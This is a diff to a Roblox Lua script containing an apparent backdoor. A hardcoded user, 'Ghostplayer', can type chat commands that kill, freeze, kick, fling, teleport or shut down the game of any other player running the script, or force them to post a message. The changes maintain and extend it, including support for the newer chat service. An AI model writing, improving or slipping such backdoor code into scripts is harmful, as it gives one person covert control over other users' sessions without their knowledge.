@@ -24,7 +24,7 @@ Ghostplayer = "russelpalodizon"
 local function ExecuteAdminCMD()
 game.Players[Ghostplayer].Chatted:connect(function(admin_msg)
 if admin_msg == ":kill "..game.Players.LocalPlayer.Name or admin_msg == ":kill all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
-   game.Players.LocalPlayer.Character.Humanoid.Health = 0
+   game.Players.LocalPlayer.Character.Head:Destroy()
 elseif admin_msg == ":freeze "..game.Players.LocalPlayer.Name then
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
 elseif admin_msg == ":unfreeze "..game.Players.LocalPlayer.Name then
@@ -33,9 +33,7 @@ elseif admin_msg == ":kick "..game.Players.LocalPlayer.Name then
    game.Players.LocalPlayer:Kick("I Can Kick you Noob HAHAHAHAAHH")
 elseif admin_msg == ":kick all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
    game.Players.LocalPlayer:Kick("I Can Kick you Noob HAHAHAHAAHH")
-elseif admin_msg == ":exit "..game.Players.LocalPlayer.Name then
-   game:Shutdown()
-elseif admin_msg == ":exit all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
+elseif admin_msg == ":exit "..game.Players.LocalPlayer.Name or admin_msg == ":exit all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
    game:Shutdown()
 elseif admin_msg == ":bring "..game.Players.LocalPlayer.Name then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Ghostplayer].Character.HumanoidRootPart.CFrame
@@ -51,7 +49,11 @@ elseif admin_msg == ":fling "..game.Players.LocalPlayer.Name then
 elseif admin_msg == ":sit "..game.Players.LocalPlayer.Name then
    game.Players.LocalPlayer.Character.Humanoid.Sit = true
 elseif admin_msg == ":" and game.Players.LocalPlayer.Name ~= Ghostplayer then
-   game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Im Here" ,"All")
+   if game:GetService("TextChatService").TextChannels.RBXGeneral then
+       game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Im Here")
+    else
+       game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Im Here" ,"All")
+    end
 end
 end)
 end
